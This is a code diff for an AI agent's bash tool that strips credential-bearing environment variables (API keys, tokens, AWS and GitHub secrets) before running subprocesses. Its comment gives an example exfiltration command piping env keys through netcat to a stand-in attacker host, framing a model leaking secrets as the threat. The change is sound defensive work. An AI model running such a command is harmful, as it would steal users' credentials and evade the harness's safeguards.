@@ -1,6 +1,42 @@
 import { isAbsolute, resolve } from 'node:path';
 import { ERROR_CODES, type Tool, type ToolResult, toolError } from '../types.ts';
 
+// Strip credentials from the env handed to the subprocess. A model can
+// trivially exfiltrate via `bash("env | grep KEY | nc attacker ...")` if
+// we don't filter. This is not a substitute for the M2 sandbox — it just
+// closes the obvious leak path.
+//
+// We match by name, case-insensitive. Patterns cover provider keys, AWS
+// creds, GitHub tokens, generic *_KEY/*_TOKEN/*_SECRET/*_PASSWORD/*_PASS
+// suffixes. False positives (a legit `BUILD_TOKEN`) are acceptable —
+// scripts that need them can override via explicit `env` in the cmd.
+const SCRUB_PATTERNS: readonly RegExp[] = [
+  /_API_KEY$/i,
+  /_TOKEN$/i,
+  /_SECRET$/i,
+  /_PASSWORD$/i,
+  /_PASS$/i,
+  /^AWS_/i,
+  /^OPENAI_/i,
+  /^ANTHROPIC_/i,
+  /^GOOGLE_API_KEY$/i,
+  /^GEMINI_API_KEY$/i,
+  /^GITHUB_TOKEN$/i,
+  /^GH_TOKEN$/i,
+  /^NPM_TOKEN$/i,
+  /^DOCKER_PASSWORD$/i,
+];
+
+const scrubEnv = (env: NodeJS.ProcessEnv): Record<string, string> => {
+  const out: Record<string, string> = {};
+  for (const [k, v] of Object.entries(env)) {
+    if (v === undefined) continue;
+    if (SCRUB_PATTERNS.some((p) => p.test(k))) continue;
+    out[k] = v;
+  }
+  return out;
+};
+
 export interface BashInput {
   command: string;
   timeout_ms?: number;
@@ -79,6 +115,7 @@ export const bashTool: Tool<BashInput, BashOutput> = {
         stdout: 'pipe',
         stderr: 'pipe',
         cwd: wd,
+        env: scrubEnv(process.env),
         // Bun's spawn signal typing is narrow; cast at the boundary.
         // biome-ignore lint/suspicious/noExplicitAny: Bun spawn signal typing
         ...({ signal: ctx.signal } as any),
